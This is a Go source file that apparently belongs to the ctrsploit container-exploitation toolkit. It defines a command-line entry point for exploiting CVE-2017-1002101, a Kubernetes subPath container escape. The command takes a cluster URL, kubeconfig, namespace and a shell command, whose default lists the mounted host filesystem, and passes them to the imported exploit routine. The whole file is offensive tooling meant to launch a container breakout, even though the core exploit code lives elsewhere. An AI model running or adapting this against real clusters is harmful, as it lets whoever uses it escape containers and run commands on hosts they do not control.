package exploit

import (
	exploit "github.com/ctrsploit/ctrsploit/exploit/CVE-2017-1002101"
	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/urfave/cli/v2"
)

//goland:noinspection GoSnakeCaseUsage
var cve_2017_1002101_Command = &cli.Command{
	Name:    exploit.ExpName,
	Aliases: []string{"subPath1", "1002101", "CVE-2017-1002101", "2017-1002101"},
	Usage:   "CVE-2017-1002101",
	Flags: []cli.Flag{
		&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Value: "ls /mnt/host; sleep 999999", Required: false},
		&cli.StringFlag{Name: "master_url", Aliases: []string{"u"}, Required: false},
		&cli.StringFlag{Name: "kubeconfig", Aliases: []string{"k"}, Required: false},
		&cli.StringFlag{Name: "namespace", Value: "default", Aliases: []string{"n"}, Required: false},
		&cli.BoolFlag{Name: "debug", Aliases: []string{"d"}, Required: false},
	},
	Action: func(context *cli.Context) error {
		masterUrl := context.String("master_url")
		kubeConfigPath := context.String("kubeconfig")
		namespace := context.String("namespace")
		shCommand := context.String("cmd")
		debug := context.Bool("debug")
		log.Logger.Infof("masterUrl: %s\tkubeconfig: %s\tnamespace: %s\n", masterUrl, kubeConfigPath, namespace)
		return exploit.InvokeExploit(masterUrl, kubeConfigPath, namespace, shCommand, debug)
	},
}
